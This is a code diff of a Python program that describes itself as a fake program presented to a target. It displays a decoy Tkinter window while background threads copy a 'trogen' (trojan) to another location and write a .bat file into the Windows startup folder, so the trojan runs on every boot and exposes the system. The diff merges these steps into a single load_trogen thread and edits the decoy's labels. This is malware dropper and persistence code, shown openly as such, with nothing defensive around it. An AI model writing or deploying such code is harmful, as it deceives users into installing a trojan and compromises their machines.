@@ -7,15 +7,17 @@ import os
 # This is a fake program which we present to the target.
 # When the user runs the program the application will create a .bat file to the start up folder
 # and copy the trogen to a different location.
-# Now on each windows start, the bat file will be executed and the trogen will be executed in background - this exposed the system to the host
+# Now on each windows start, the bat file will be executed which in turn will execute the trogen in background and expose the system to the host
 '''
 def open_fake_program():
     window = tk.Tk()
     window.title("Aravind R Pillai")
     window.geometry("300x200")
-    label = tk.Label(window, text="This is fake program to load the actual files to the guest system")
+    label = tk.Label(window, text="\n\nThis is fake program to load the \nactual files to the guest system. ")
     label.pack()
-    button = tk.Button(window, text="Click Me")
+    label = tk.Label(window, text="\nAravind R Pillai. \n")
+    label.pack()
+    button = tk.Button(window, text="You don't need to click me")
     button.pack()
     window.mainloop()
 
@@ -45,14 +47,15 @@ def create_startup_file():
     except IOError:
         print("Error: Unable to write to the file.")
 
+def load_trogen():
+    copy_trogen_to_disk()
+    create_startup_file()
 
 if __name__ == '__main__':  
-    copy_trogen_to_disk_thread = threading.Thread(target=copy_trogen_to_disk, args=())
-    create_startup_file_thread = threading.Thread(target=create_startup_file, args=())
+    load_trogen_thread = threading.Thread(target=load_trogen, args=())
     open_fake_program_thread = threading.Thread(target=open_fake_program, args=())
     
-    copy_trogen_to_disk_thread.start()
-    create_startup_file_thread.start()
+    load_trogen_thread.start()
     open_fake_program_thread.start()
 
 
